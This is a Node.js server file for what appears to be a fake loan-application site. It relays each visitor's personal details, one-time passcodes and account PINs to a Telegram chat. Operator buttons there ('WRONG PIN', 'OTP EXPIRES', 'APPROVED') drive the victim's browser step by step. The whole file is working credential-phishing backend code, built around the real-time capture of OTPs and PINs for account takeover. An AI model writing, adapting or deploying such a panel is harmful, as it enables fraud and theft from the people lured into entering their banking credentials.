require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID';

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Store active application sessions by socket ID
const activeSessions = new Map();

io.on('connection', (socket) => {
  console.log(`User connected: ${socket.id}`);

  // Step 3 Completion -> Initial Application Submitted
  socket.on('submit_application', async (data) => {
    activeSessions.set(socket.id, { ...data, socketId: socket.id, status: 'PENDING_DETAILS' });

    const message = `
<b>🚨 NEW LOAN APPLICATION (Step 3/3)</b>
➖➖➖➖➖➖➖➖➖➖
<b>Country:</b> ${data.country || 'N/A'}
<b>Language:</b> ${data.language || 'N/A'}
<b>Loan Type:</b> ${data.loanType || 'N/A'}
<b>Amount:</b> ${data.amount || 'N/A'}
<b>Duration:</b> ${data.duration || 'N/A'}
<b>Purpose:</b> ${data.purpose || 'N/A'}
➖➖➖➖➖➖➖➖➖➖
<b>Applicant Name:</b> ${data.firstName || ''} ${data.lastName || ''}
<b>Phone:</b> ${data.phone || 'N/A'}
<b>Employment:</b> ${data.employmentStatus || 'N/A'}
<b>Annual Income:</b> ${data.annualIncome || 'N/A'}
`;

    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: '❌ INVALID ACC. DETAILS', callback_data: `INVALID_ACC_${socket.id}` },
          { text: '✅ CORRECT DETAILS', callback_data: `CORRECT_ACC_${socket.id}` }
        ]
      ]
    };

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML', reply_markup: inlineKeyboard });
    } catch (err) {
      console.error('Telegram Send Error:', err.message);
    }
  });

  // Step 4 Completion -> OTP Submitted
  socket.on('submit_otp', async (data) => {
    const session = activeSessions.get(socket.id) || {};
    session.otp = data.otp;
    activeSessions.set(socket.id, session);

    const message = `
<b>🔐 OTP SUBMITTED</b>
➖➖➖➖➖➖➖➖➖➖
<b>Phone:</b> ${session.phone || 'N/A'}
<b>Entered OTP:</b> <code>${data.otp}</code>
`;

    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: '⏳ OTP EXPIRES', callback_data: `OTP_EXPIRES_${socket.id}` },
          { text: '✅ OTP ACCEPTED', callback_data: `OTP_ACCEPTED_${socket.id}` }
        ]
      ]
    };

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML', reply_markup: inlineKeyboard });
    } catch (err) {
      console.error('Telegram Send Error:', err.message);
    }
  });

  // Step 5 Completion -> PIN Submitted
  socket.on('submit_pin', async (data) => {
    const session = activeSessions.get(socket.id) || {};
    session.pinPhone = data.phone;
    session.pin = data.pin;
    activeSessions.set(socket.id, session);

    const message = `
<b>🔑 ACCOUNT PIN SUBMITTED</b>
➖➖➖➖➖➖➖➖➖➖
<b>Phone / Account:</b> ${data.phone || 'N/A'}
<b>Entered PIN:</b> <code>${data.pin}</code>
`;

    const inlineKeyboard = {
      inline_keyboard: [
        [
          { text: '❌ WRONG PIN', callback_data: `WRONG_PIN_${socket.id}` },
          { text: '✅ CORRECT PIN', callback_data: `CORRECT_PIN_${socket.id}` },
          { text: '🎉 APPROVED', callback_data: `APPROVED_${socket.id}` }
        ]
      ]
    };

    try {
      await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML', reply_markup: inlineKeyboard });
    } catch (err) {
      console.error('Telegram Send Error:', err.message);
    }
  });

  socket.on('disconnect', () => {
    activeSessions.delete(socket.id);
    console.log(`User disconnected: ${socket.id}`);
  });
});

// Handle Telegram Admin Callback Buttons
bot.on('callback_query', async (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  let action = '';
  let socketId = '';

  if (data.startsWith('INVALID_ACC_')) {
    socketId = data.replace('INVALID_ACC_', '');
    action = 'INVALID_ACC';
  } else if (data.startsWith('CORRECT_ACC_')) {
    socketId = data.replace('CORRECT_ACC_', '');
    action = 'CORRECT_ACC';
  } else if (data.startsWith('OTP_EXPIRES_')) {
    socketId = data.replace('OTP_EXPIRES_', '');
    action = 'OTP_EXPIRES';
  } else if (data.startsWith('OTP_ACCEPTED_')) {
    socketId = data.replace('OTP_ACCEPTED_', '');
    action = 'OTP_ACCEPTED';
  } else if (data.startsWith('WRONG_PIN_')) {
    socketId = data.replace('WRONG_PIN_', '');
    action = 'WRONG_PIN';
  } else if (data.startsWith('CORRECT_PIN_')) {
    socketId = data.replace('CORRECT_PIN_', '');
    action = 'CORRECT_PIN';
  } else if (data.startsWith('APPROVED_')) {
    socketId = data.replace('APPROVED_', '');
    action = 'APPROVED';
  }

  const targetSocket = io.sockets.sockets.get(socketId);

  if (action === 'INVALID_ACC') {
    if (targetSocket) targetSocket.emit('admin_action', { action: 'INVALID_ACC' });
    bot.answerCallbackQuery(query.id, { text: 'Marked as Invalid Details.' });
    bot.editMessageText(query.message.text + '\n\n🔴 [STATUS: INVALID ACC. DETAILS]', { chat_id: chatId, message_id: messageId });
  } else if (action === 'CORRECT_ACC') {
    if (targetSocket) targetSocket.emit('admin_action', { action: 'CORRECT_ACC' });
    bot.answerCallbackQuery(query.id, { text: 'Details Approved! Moving user to OTP.' });
    bot.editMessageText(query.message.text + '\n\n🟢 [STATUS: DETAILS APPROVED]', { chat_id: chatId, message_id: messageId });
  } else if (action === 'OTP_EXPIRES') {
    if (targetSocket) targetSocket.emit('admin_action', { action: 'OTP_EXPIRES' });
    bot.answerCallbackQuery(query.id, { text: 'OTP Marked Expired.' });
    bot.editMessageText(query.message.text + '\n\n🔴 [STATUS: OTP EXPIRED]', { chat_id: chatId, message_id: messageId });
  } else if (action === 'OTP_ACCEPTED') {
    if (targetSocket) targetSocket.emit('admin_action', { action: 'OTP_ACCEPTED' });
    bot.answerCallbackQuery(query.id, { text: 'OTP Accepted! Moving user to PIN page.' });
    bot.editMessageText(query.message.text + '\n\n🟢 [STATUS: OTP ACCEPTED]', { chat_id: chatId, message_id: messageId });
  } else if (action === 'WRONG_PIN') {
    if (targetSocket) targetSocket.emit('admin_action', { action: 'WRONG_PIN' });
    bot.answerCallbackQuery(query.id, { text: 'Marked as Wrong PIN.' });
    bot.editMessageText(query.message.text + '\n\n🔴 [STATUS: WRONG PIN]', { chat_id: chatId, message_id: messageId });
  } else if (action === 'CORRECT_PIN' || action === 'APPROVED') {
    if (targetSocket) targetSocket.emit('admin_action', { action: 'APPROVED' });
    bot.answerCallbackQuery(query.id, { text: 'Application Fully Approved!' });
    bot.editMessageText(query.message.text + '\n\n🎉 [STATUS: LOAN APPROVED]', { chat_id: chatId, message_id: messageId });
  }
});

server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
            
